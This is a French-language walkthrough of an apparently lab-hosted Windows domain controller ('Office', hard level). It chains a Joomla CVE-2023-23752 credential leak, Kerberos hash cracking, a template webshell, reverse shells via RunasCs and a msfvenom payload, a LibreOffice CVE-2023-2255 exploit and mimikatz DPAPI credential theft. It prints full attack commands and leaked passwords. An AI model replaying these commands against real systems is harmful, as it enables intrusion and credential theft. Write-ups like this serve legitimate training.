# Infos

Level : Hard
OS : Windows Server 2022 Standard x64
IP : 10.129.95.16

# Reconnaissance

## Nmap

## TCP

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-21 16:54:17Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57989/tcp open  msrpc         Microsoft Windows RPC
58004/tcp open  msrpc         Microsoft Windows RPC
62034/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## UDP

```
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
```

# Ports
## 80 - HTTP/tcp

Sous le port 80, on retrouve un blog en lien avec Iron Man, Tony Stark peut également être un utilisateur intéressant pour la suite.

![[80-site.png]]

Au niveau de la techstack, on retrouve

![[80-techstack.png]]

- Enumération du CMS avec Joomscan -> rien.
- Enumération des répertoires et fichiers avec ffuf :

```
ffuf -c -w `fzf-wordlists` -u "http://office.htb/FUZZ" -e .php
```

- http://office.htb/administrator/ -> interface de connexion au panel d'admin
- http://office.htb/phpmyadmin -> forbidden 403
- http://office.htb/api/ -> API
- https://office.htb/cli/ -> forbidden 403
- plein d'autres, on y reviendra plus tard si besoin.

Enumération des sous-domaines :

```
ffuf -c -w `fzf-wordlists` -H "Host: FUZZ.office.htb" -u "http://office.htb/"
```

C'est relativement lent, on y reviendra plus tard.

En faisant des recherches, on retrouve que Joomla est vulnérable à la [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752). Elle permet d'abuser d'un contrôle accès incorrect pour accéder aux endpoints des services web.

Détails techniques : https://xz.aliyun.com/t/12175?time__1311=mqmhD5DK7IejhDBdPx2DUo1DcWoUP4jex&alichlgref=https%3A%2F%2Fvulncheck.com%2F

- /api/index.php/v1/users?public=true -> pour les usernames
- /api/index.php/v1/config/application?public=true -> pour les passwords

On peut utiliser cet [outil](https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT) sur Github pour retrouver des creds `Administrator:H0lOgrams4reTakIng0Ver754!`.

`python3 CVE-2023-23752.py -u http://office.htb`

![[80-password.png]]

Utilisation de kerbrute pour retrouver des utilisateurs potentiels

`kerbrute userenum -d "office.htb" usernames.txt --dc dc.office.htb`

![[kerbrute.png]]

On peut voir que ce compte `office.htb\dwolfe` possède des accès en SMB

![[nxc-password sprying.png]]

Enumération des partages

![[nxc-shares.png]]
### Foothold - web_account

On retrouve le share `SOC Analysis` qui semble intéressant. Connexion au share, il y a un fichier .pcap que l'on récupère

![[get_pcap.png]]

On est en présence d'un fichier .pcap avec le protocole kerberos qui montre que le compte tstark est vulnérable à une pre-auth kerberos, et on peut récupérer son mot de passe.
-> https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/

![[krb-preauth.png]]

Format pour le cracking

```
hashcat.exe -m 19900 "$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc" C:\Users\LucasLefèvre\Downloads\rockyou.txt
```

Après avoir télécharger la version BETA d'hashcat afin de pouvoir accéder au mode 19900, on peut retrouver le mot de passe de `tstark:playboy69`.

![[hashcat-crack.png]]
On peut se connecter au panel d'admin Joomla avec les creds `Administrator:playboy69`.

![[80-joomdash.png]]

On peut modifier le template afin d'insérer un webshell PHP

![[80-code.png]]

On peut aussi utiliser ce [script](https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php) PHP pour obtenir un reverse shell à la place d'index.php par exemple.

![[80-websvc.png]]
## Pivot - tstark

Après avoir transférer RunasCs et nc.exe sur la target, obtenir un shell en tant que tstark

`RunasCs.exe tstark playboy69 cmd.exe -r 10.10.14.36:9001`

![[runascs.png]]

## Pivot latéral - ppots

En enumérant, on retrouve un autre site web `Internal` sous `C:\xampp\htdocs\internal`

![[int-resume.png]]
En regardant le code source, on peut voir que c'est un application qui fait du file upload, avec les extensions de fichiers autorisés (.docm, .docx, .doc, .odt).

![[int-code.png]]

Regarder les ports TCP ouverts en local

`netstat -ano -p tcp`

![[int-8083.png]]

On peut voir plusieurs ports en écoute dont le 8083 qui semble intéressant, c'est le PID 4304. On peut voir qu'il est lié aussi aux ports 443 et 80.

Obtenir plus de détails sur le processus en question.

`tasklist /FI "PID eq 4304"`

![[int-4304.png]]
Il s'agit bien d'un service web, la prochaine étape est de setup ce qu'il faut pour réaliser un local port forwarding avec un outil comme chisel par exemple.

![[chisel.png]]

On retrouve un autre site disponible sur le port 8083 forward

![[8083-site.png]]

On peut upload des fichiers qui font référence à la CVE-2023-2255 et libreoffice. Elweth a créer un POC en python pour créer le fichier vulnérable.

On commence par créer un reverse shell avec une extension .exe avec msfvenom et à l'aide du [script](https://github.com/elweth-sec/CVE-2023-2255) avec on lance l'exploit en précisant les commandes `C:\Users\Public\rev.exe` pour exécuter notre shell.exe

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.39 LPORT=9001 -f exe > rev.exe
python3 CVE-2023-2255.py --cmd 'C:\Users\Public\rev.exe' --output 'exploit.odt'
```

Puis on ouvre un listener sur le port 9001, on dépose le fichier .exe dans `C:\Users\Public\` et on upload le fichier .odt par la fonctionnalité de file upload.

![[resume-ppots.png]]

On obtient un shell en tant que `office\ppotts` sur DC.
## Pivot latéral - HHogan

1) Enumérer les fichiers dans `C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\`
2) Dans mimikatz.exe, lister le contenu des fichiers credentials, pour récupérer et noter les guidMaster Key

`dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\XXXXX`

3) Enumérer les répertoires sous `C:\Users\PPotts\appdata\roaming\microsoft\protect\`
4) Récupérer le SID et poursuivre l'énumération dans 
 
`C:\Users\PPotts\appdata\roaming\microsoft\protect\<SID>`

5) On retrouve plusieurs dossiers, avec des noms qui commencent par les guidMasterKey que l'on a noté précédemment, dans mimikatz

`dpapi::masterkey /in:C:\Users\PPotts\appdata\roaming\microsoft\protect\<SID>\<guidMasterKey> /rpc`

6) L'output fourni un résultat verbeux, regarder les dernières lignes et chercher une longue clé nommé `[DomainKey] with RPC` puis la copier
7) Dans mimikatz

`dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\XXXXXX /masterkey::<key>`

8) Récupérer les creds et se connecter avec evil-winrm

https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials